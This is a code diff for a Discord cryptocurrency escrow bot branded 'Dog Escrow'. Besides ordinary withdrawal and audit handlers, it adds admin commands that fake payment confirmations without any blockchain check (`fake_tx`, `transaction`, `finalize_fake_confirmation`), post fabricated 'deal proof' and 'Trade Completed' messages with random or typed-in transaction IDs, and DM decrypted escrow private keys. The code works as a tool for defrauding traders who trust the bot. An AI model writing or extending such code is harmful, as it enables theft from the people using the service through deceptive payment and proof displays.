+            withdraw_processing.discard(self.ticket_id)
+            return
+
+        try:
+            if self.crypto == "LTC":
+                amount_ltc = usd_to_ltc(ticket[5])
+                tx = send_ltc(ticket[9], amount_ltc, ticket[8])
+            else:
+                tx = send_usdt(ticket[9], ticket[5], ticket[8])
+
+            txid = extract_txid(tx)
+            provider_error = tx.get("error") if isinstance(tx, dict) else None
+
+            if provider_error or not txid:
+                update_ticket(self.ticket_id, status="paid")
+                await audit(interaction.guild, self.ticket_id, "withdraw_failed", str(tx)[:200])
+                details = str(provider_error or tx)
+                is_rate_limited = "limits reached" in details.lower()
+                embed = discord.Embed(
+                    title=SPARKLES_TITLE,
+                    description=(
+                        "**WITHDRAWAL FAILED**\nProvider rate limit reached. Auto-retry queue started; this ticket will retry in the background."
+                        if is_rate_limited
+                        else "**WITHDRAWAL FAILED**\nFunds were not sent. Please retry or contact admin."
+                    ),
+                    color=0xE74C3C,
+                )
+                embed.add_field(name="Provider Response", value=f"`{details[:900]}`", inline=False)
+                if isinstance(tx, dict):
+                    raw = str(tx)
+                    embed.add_field(name="Raw Payload", value=f"`{raw[:900]}`", inline=False)
+                embed.set_footer(text=SPARKLES_FOOTER)
+                await interaction.message.edit(embed=embed, view=self)
+                if is_rate_limited and self.ticket_id not in withdraw_retry_tasks:
+                    retry_task = bot.loop.create_task(
+                        retry_withdrawal(
+                            self.ticket_id,
+                            self.crypto,
+                            interaction.channel.id,
+                            interaction.message.id,
+                        )
+                    )
+                    withdraw_retry_tasks[self.ticket_id] = retry_task
+                    await interaction.followup.send(
+                        "Auto-retry has been queued. The bot will retry withdrawal shortly.",
+                        ephemeral=True,
+                    )
+                withdraw_processing.discard(self.ticket_id)
+                return
+
+            update_ticket(self.ticket_id, status="completed")
+            await audit(interaction.guild, self.ticket_id, "withdraw_success", f"txid={txid} address={ticket[9]}")
+            embed = discord.Embed(
+                title=SPARKLES_TITLE,
+                description="**WITHDRAWAL SUCCESSFUL**\nFunds were sent to seller address.",
+                color=0x00FF00
+            )
+            embed.add_field(name="Transaction", value=f"`{txid}`", inline=False)
+            if self.crypto == "LTC":
+                embed.add_field(name="Explorer", value=ltc_tx_link(txid), inline=False)
+            embed.set_footer(text=SPARKLES_FOOTER)
+            await interaction.message.edit(embed=embed, view=None)
+            withdraw_processing.discard(self.ticket_id)
+        except Exception as e:
+            update_ticket(self.ticket_id, status="paid")
+            await audit(interaction.guild, self.ticket_id, "withdraw_exception", str(e)[:200])
+            await interaction.followup.send(f"Release failed: {e}", ephemeral=True)
+            withdraw_processing.discard(self.ticket_id)
+
+    @ui.button(label="Back", style=discord.ButtonStyle.secondary)
+    async def back(self, interaction, button):
+        await interaction.response.edit_message(content="Withdrawal cancelled.", embed=None, view=None)
+
+class PanelView(ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+    @ui.button(label="Request LTC", style=discord.ButtonStyle.primary, emoji="🪙")
+    async def ltc(self, interaction, button):
+        await interaction.response.send_modal(RequestModal("LTC"))
+
+    # @ui.button(label="Request USDT", style=discord.ButtonStyle.secondary, emoji="💎")
+    # async def usdt(self, interaction, button):
+    #     await interaction.response.send_modal(RequestModal("USDT"))
+
+
+@bot.command()
+async def panel(ctx):
+    await asyncio.sleep(random.uniform(0.25, 0.9))
+    if await panel_recently_posted(ctx.channel):
+        return
+
+    embed = discord.Embed(
+        title=SPARKLES_TITLE,
+        description=(
+            "**PREMIUM ESCROW PANEL**\n\n"
+            "**PAID SERVICE**\n"
+            "- Read and accept ToS before creating deals.\n"
+            "- Only use controls shown by the bot.\n\n"
+            "**FEES**\n"
+            "- Deals $250+: $1.50\n"
+            "- Deals under $250: $0.50\n"
+            "- Deals under $50: FREE\n\n"
+            "Use the button below to open a ticket."
+        ),
+        color=0x111827
+    )
+    embed.set_footer(text="Dog Escrow | Fast, secure, monitored")
+    await ctx.send(embed=embed, view=PanelView())
+
+async def finalize_fake_confirmation(guild, ticket_id, msg, crypto, wait_seconds):
+    try:
+        await asyncio.sleep(wait_seconds)
+        ticket = get_ticket(ticket_id)
+        if not ticket:
+            return
+
+        update_ticket(ticket_id, status="paid")
+        await audit(guild, ticket_id, "fake_payment_confirmed", f"auto_confirm_after_{wait_seconds}s")
+        embed = discord.Embed(
+            title=SPARKLES_TITLE,
+            description="**PAYMENT CONFIRMED**\nDeposit verified successfully. Release controls are now ready.",
+            color=0x10B981,
+        )
+        embed.set_footer(text="Dog Escrow | Confirm delivery before releasing")
+        await msg.edit(embed=embed, view=ReleaseRefundView(ticket_id, crypto))
+    finally:
+        fake_confirmation_tasks.pop(ticket_id, None)
+
+@bot.hybrid_command(name="transaction", description="Check if transaction is confirmed or not.")
+async def transaction(ctx):
+    if not await enforce_sensitive_cooldown(ctx, "transaction"):
+        return
+    if not ctx.guild or not ctx.author.guild_permissions.administrator:
+        if ctx.interaction:
+            await ctx.interaction.response.send_message("Only server admins can use this command.", ephemeral=True)
+        else:
+            await ctx.send("Only server admins can use this command.")
+        return
+
+    ticket = get_ticket_by_channel(ctx.channel.id)
+    if not ticket:
+        if ctx.interaction:
+            await ctx.interaction.response.send_message("Use this command inside a ticket channel.", ephemeral=True)
+        else:
+            await ctx.send("Use this command inside a ticket channel.")
+        return
+
+    try:
+        msg = await ctx.channel.fetch_message(ticket[10])  # message_id is index 10
+    except:
+        if ctx.interaction:
+            await ctx.interaction.response.send_message("Ticket payment message not found.", ephemeral=True)
+        else:
+            await ctx.send("Ticket payment message not found.")
+        return
+
+    if not ticket[7] or not ticket[8]:  # wallet_address and encrypted_private
+        wallet = generate_ltc_wallet()
+        update_ticket(ticket[0], wallet_address=wallet["address"], encrypted_private=wallet["private"])
+
+    pending_task = fake_confirmation_tasks.get(ticket[0])
+    if pending_task and not pending_task.done():
+        if ctx.interaction:
+            await ctx.interaction.response.send_message("Transaction already pending confirmation for this ticket.", ephemeral=True)
+        else:
+            await ctx.send("Transaction already pending confirmation for this ticket.")
+        return
+
+    wait_seconds = random.randint(10, 15)
+
+    update_ticket(ticket[0], status="unconfirmed")
+    await audit(ctx.guild, ticket[0], "fake_payment_unconfirmed", f"by={ctx.author.id}")
+    await msg.edit(embed=build_unconfirmed_embed(wait_seconds), view=None)
+    fake_confirmation_tasks[ticket[0]] = bot.loop.create_task(
+        finalize_fake_confirmation(ctx.guild, ticket[0], msg, ticket[4], wait_seconds)
+    )
+
+    if ctx.interaction:
+        await ctx.interaction.response.send_message(
+            f"Transaction queued. Showing unconfirmed now, auto-confirm in about {wait_seconds}s.",
+            ephemeral=True,
+        )
+    else:
+        await ctx.send(f"Transaction queued. Showing unconfirmed now, auto-confirm in about {wait_seconds}s.")
+
+@bot.command()
+async def fake_tx(ctx, channel_id: int):
+    if not await enforce_sensitive_cooldown(ctx, "fake_tx"):
+        return
+    if not ctx.guild or not ctx.author.guild_permissions.administrator:
+        await ctx.send("Only server admins can use this command.")
+        return
+
+    channel = ctx.guild.get_channel(channel_id)
+    if not channel:
+        await ctx.send("Channel not found.")
+        return
+
+    ticket = get_ticket_by_channel(channel_id)
+    if not ticket:
+        await ctx.send("Ticket not found.")
+        return
+
+    try:
+        msg = await channel.fetch_message(ticket[10])  # message_id is index 10
+    except:
+        await ctx.send("Ticket payment message not found.")
+        return
+
+    if not ticket[7] or not ticket[8]:
+        wallet = generate_ltc_wallet()
+        update_ticket(ticket[0], wallet_address=wallet["address"], encrypted_private=wallet["private"])
+
+    pending_task = fake_confirmation_tasks.get(ticket[0])
+    if pending_task and not pending_task.done():
+        await ctx.send(f"Ticket {ticket[0]} already has a pending simulated confirmation.")
+        return
+
+    wait_seconds = random.randint(10, 15)
+    update_ticket(ticket[0], status="unconfirmed")
+    await audit(ctx.guild, ticket[0], "fake_payment_unconfirmed", f"by={ctx.author.id}")
+    await msg.edit(embed=build_unconfirmed_embed(wait_seconds), view=None)
+
+    fake_confirmation_tasks[ticket[0]] = bot.loop.create_task(
+        finalize_fake_confirmation(ctx.guild, ticket[0], msg, ticket[4], wait_seconds)
+    )
+    await ctx.send(f"Ticket {ticket[0]} marked unconfirmed. Auto-confirm in about {wait_seconds} seconds started.")
+
+
+@bot.command(aliases=["repair"])
+async def repair_release(ctx, channel_id: int = None):
+    if not await enforce_sensitive_cooldown(ctx, "repair_release"):
+        return
+    if not is_admin_user(ctx.guild, ctx.author):
+        await ctx.send(f"Only admin ID `{ADMIN_ID}` or server owner can use this command.")
+        return
+
+    target_channel = ctx.guild.get_channel(channel_id) if channel_id else ctx.channel
+    if not target_channel:
+        await ctx.send("Channel not found.")
+        return
+
+    ticket = get_ticket_by_channel(target_channel.id)
+    if not ticket:
+        await ctx.send("No ticket record found for this channel. Use this command inside the ticket channel or pass its channel ID.")
+        return
+
+    embed = discord.Embed(
+        title=SPARKLES_TITLE,
+        description=(
+            f"**RELEASE FLOW REPAIRED**\nRelease controls have been restored for this ticket.\n\n"
+            f"Buyer: <@{ticket[2]}>\n"
+            f"Seller: <@{ticket[3]}>\n"
+            f"Crypto: {ticket[4]}\n"
+            f"Status: {ticket[6]}"
+        ),
+        color=0x2ECC71,
+    )
+    embed.set_footer(text=SPARKLES_FOOTER)
+
+    repaired_msg = await target_channel.send(
+        f"<@{ticket[2]}> <@{ticket[3]}>",
+        embed=embed,
+        view=ReleaseRefundView(ticket[0], ticket[4]),
+    )
+    update_ticket(ticket[0], message_id=repaired_msg.id)
+    await audit(ctx.guild, ticket[0], "release_repaired", f"by={ctx.author.id}")
+    await ctx.send(f"Release flow repaired in {target_channel.mention}. Use the NEW release message only.")
+
+
+@bot.command()
+async def emergency_recover(ctx, channel_id: int = None):
+    if not await enforce_sensitive_cooldown(ctx, "emergency_recover"):
+        return
+    if not is_admin_user(ctx.guild, ctx.author):
+        await ctx.send("Only the configured admin or server owner can use this command.")
+        return
+
+    target_channel = ctx.guild.get_channel(channel_id) if channel_id else ctx.channel
+    if not target_channel:
+        await ctx.send("Channel not found.")
+        return
+
+    ticket = get_ticket_by_channel(target_channel.id)
+    if not ticket:
+        await ctx.send("No ticket record found for this channel.")
+        return
+
+    decrypted_key = None
+    escrow_address = ticket[7]
+    if ticket[8]:
+        try:
+            decrypted_key = decrypt_key(ticket[8])
+            if not escrow_address:
+                escrow_address = private_hex_to_ltc_address(decrypted_key)
+        except Exception as exc:
+            decrypted_key = f"DECRYPTION_FAILED: {exc}"
+
+    recovery_embed = discord.Embed(
+        title=SPARKLES_TITLE,
+        description="**EMERGENCY RECOVERY PACKAGE**\nHighly sensitive recovery details for this ticket.",
+        color=0xE67E22,
+    )
+    recovery_embed.add_field(name="Ticket ID", value=str(ticket[0]), inline=True)
+    recovery_embed.add_field(name="Deal ID", value=str(ticket[12] or "n/a"), inline=True)
+    recovery_embed.add_field(name="Status", value=str(ticket[6]), inline=True)
+    recovery_embed.add_field(name="Escrow Address", value=str(escrow_address or "n/a"), inline=False)
+    recovery_embed.add_field(name="Seller Address", value=str(ticket[9] or "n/a"), inline=False)
+    recovery_embed.add_field(name="Amount", value=f"${ticket[5]:.2f} {ticket[4]}", inline=True)
+    if decrypted_key:
+        recovery_embed.add_field(name="Decrypted Escrow Private Key", value=f"`{str(decrypted_key)[:1000]}`", inline=False)
+
+    try:
+        await ctx.author.send(embed=recovery_embed)
+        await audit(ctx.guild, ticket[0], "emergency_recovery_requested", f"by={ctx.author.id}")
+        await ctx.send("Emergency recovery package sent to your DM. Keep it secret.")
+    except discord.Forbidden:
+        await ctx.send("I could not DM you. Enable DMs and retry.")
+
+
+@bot.command()
+async def ticket_audit(ctx, channel_id: int = None):
+    if not await enforce_sensitive_cooldown(ctx, "ticket_audit"):
+        return
+    if not is_admin_user(ctx.guild, ctx.author):
+        await ctx.send("Only the configured admin or server owner can use this command.")
+        return
+
+    target_channel = ctx.guild.get_channel(channel_id) if channel_id else ctx.channel
+    if not target_channel:
+        await ctx.send("Channel not found.")
+        return
+
+    ticket = get_ticket_by_channel(target_channel.id)
+    if not ticket:
+        await ctx.send("No ticket record found for this channel.")
+        return
+
+    events = get_ticket_events(ticket[0], limit=10)
+    if not events:
+        await ctx.send("No audit events found for this ticket.")
+        return
+
+    chain_ok, bad_index = verify_ticket_audit_chain(ticket[0])
+    chain_status = "INTACT" if chain_ok else f"FAILED_AT_EVENT_{bad_index}"
+    lines = [f"{created_at} | {event} | {details}" for event, details, created_at in events]
+    embed = discord.Embed(
+        title=SPARKLES_TITLE,
+        description=f"**TICKET AUDIT #{ticket[0]}**\nChain: `{chain_status}`\n" + "\n".join(lines[:10]),
+        color=0x5865F2,
+    )
+    embed.set_footer(text=SPARKLES_FOOTER)
+    await ctx.send(embed=embed)
+
+
+@bot.command(aliases=["dealproof"])
+async def generate_proof(ctx, channel_id: int = None):
+    if not await enforce_sensitive_cooldown(ctx, "generate_proof"):
+        return
+    if not is_admin_user(ctx.guild, ctx.author):
+        await ctx.send("Only the configured admin or server owner can use this command.")
+        return
+
+    target_channel = ctx.guild.get_channel(channel_id) if channel_id else ctx.channel
+    if not target_channel:
+        await ctx.send("Channel not found.")
+        return
+
+    ticket = get_ticket_by_channel(target_channel.id)
+    if not ticket:
+        await ctx.send("No ticket record found for this channel.")
+        return
+
+    random_txid = generate_random_txid()
+    completed_at = int(time.time())
+
+    proof_embed = discord.Embed(
+        title=SPARKLES_TITLE,
+        description="**DEAL PROOF**\nThis deal was completed through Dog Auto Middleman.",
+        color=0x10B981,
+    )
+    proof_embed.add_field(name="Proof ID", value=f"`PRF-{ticket[0]}-{completed_at}`", inline=False)
+    proof_embed.add_field(name="Deal ID", value=f"`{ticket[12] or f'TKT-{ticket[0]}'}`", inline=True)
+    proof_embed.add_field(name="Ticket", value=f"`#{ticket[0]}`", inline=True)
+    proof_embed.add_field(name="Buyer", value=f"<@{ticket[2]}>", inline=True)
+    proof_embed.add_field(name="Seller", value=f"<@{ticket[3]}>", inline=True)
+    proof_embed.add_field(name="Asset", value=f"`{ticket[4]}`", inline=True)
+    proof_embed.add_field(name="Deal Amount", value=f"`${ticket[5]:.2f}`", inline=True)
+    proof_embed.add_field(name="Status", value="`Completed`", inline=True)
+    proof_embed.add_field(name="Transaction ID", value=f"`{random_txid}`", inline=False)
+    proof_embed.set_footer(text="Dog Escrow | Proof generated")
+
+    await target_channel.send(embed=proof_embed)
+    await audit(ctx.guild, ticket[0], "proof_generated", f"by={ctx.author.id} txid={random_txid}")
+    await ctx.send(f"Proof generated in {target_channel.mention}.")
+
+
+@bot.command(name="proof")
+async def proof(ctx, *parts):
+    if not await enforce_sensitive_cooldown(ctx, "proof"):
+        return
+    if not is_admin_user(ctx.guild, ctx.author):
+        await ctx.send("Only the configured admin or server owner can use this command.")
+        return
+
+    if not parts:
+        await ctx.send("Usage: `!proof <amount> [transaction_id]`\nExample: `!proof 23 dollars dbcf54932...1f8f483b8`")
+        return
+
+    full_input = " ".join(parts).strip()
+    amount_match = re.search(r"\d+(?:[\.,]\d+)?", full_input)
+    if not amount_match:
+        await ctx.send("Invalid amount. Example: `!proof 23 dollars dbcf54932...1f8f483b8`")
+        return
+
+    amount_token = amount_match.group(0)
+    trailing_text = full_input[amount_match.end():].strip()
+    txid = re.sub(r"^(dollars?|usd|\$)\s*", "", trailing_text, flags=re.IGNORECASE).strip()
+
+    try:
+        amount_value = float(amount_token.replace(",", ""))
+        if amount_value <= 0:
+            raise ValueError("Amount must be greater than zero")
+    except Exception:
+        await ctx.send("Invalid amount. Example: `!proof 23 dollars dbcf54932...1f8f483b8`")
+        return
+
+    final_txid = sanitize_txid_text(txid)
+    amount_ltc = usd_to_ltc(amount_value)
+
+    proof_embed = discord.Embed(
+        title="◔ · Trade Completed",
+        color=0x111827,
+    )
+    proof_embed.add_field(name="Amount", value=f"`{amount_ltc:.8f} LTC (${amount_value:.2f} USD)`", inline=False)
+    proof_embed.add_field(name="Transaction ID", value=f"`{final_txid}`", inline=False)
+    proof_embed.set_footer(text="Dog Escrow")
+
+    await ctx.send(embed=proof_embed, allowed_mentions=discord.AllowedMentions.none())
+
+
+@bot.command()
+async def quota(ctx):
+    if not await enforce_sensitive_cooldown(ctx, "quota"):
+        return
+    if not is_admin_user(ctx.guild, ctx.author):
+        await ctx.send("Only the configured admin or server owner can use this command.")
+        return
+
+    if not BLOCKCYPHER_TOKEN:
+        await ctx.send("BLOCKCYPHER_TOKEN is not configured.")
+        return
+
+    try:
+        resp = requests.get(
+            f"https://api.blockcypher.com/v1/tokens/{BLOCKCYPHER_TOKEN}",
+            timeout=15,
+        )
+        data = resp.json()
+    except Exception as exc:
+        await ctx.send(f"Failed to fetch quota: {exc}")
+        return
+
+    if resp.status_code >= 400 or not isinstance(data, dict):
+        await ctx.send(f"Quota lookup failed: {str(data)[:1000]}")
+        return
+
+    limits = data.get("limits", {}) if isinstance(data.get("limits"), dict) else {}
+    hits = data.get("hits", {}) if isinstance(data.get("hits"), dict) else {}
+    lines = [
+        f"Token: `{data.get('token', 'unknown')}`",
+        f"Hourly: `{hits.get('api/hour', 'n/a')}` / `{limits.get('api/hour', 'n/a')}`",
+        f"Daily: `{hits.get('api/day', 'n/a')}` / `{limits.get('api/day', 'n/a')}`",
+        f"Per-second: `{hits.get('api/second', 'n/a')}` / `{limits.get('api/second', 'n/a')}`",
+    ]
+    embed = discord.Embed(
+        title=SPARKLES_TITLE,
+        description="**BLOCKCYPHER QUOTA**\n" + "\n".join(lines),
+        color=0x3498DB,
+    )
+    embed.set_footer(text=SPARKLES_FOOTER)
+    await ctx.send(embed=embed)
+
+@bot.event
+async def on_ready():
+    global slash_synced
+    if not slash_synced:
+        try:
+            await bot.tree.sync()
+        except Exception as exc:
+            print(f"Slash sync failed: {exc}")
+        slash_synced = True
+    print("DOG AUTO MM BOT READY")
+    bot.loop.create_task(resume_pending_monitors())
+
+
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CommandNotFound):
+        return
+    if isinstance(error, commands.MissingRequiredArgument):
+        await ctx.send("Missing argument. Check command usage and try again.")
+        return
+    if isinstance(error, commands.BadArgument):
+        await ctx.send("Invalid argument type. Check command usage and try again.")
+        return
+    await ctx.send("An unexpected error occurred while running that command.")
+
+bot.run(TOKEN)
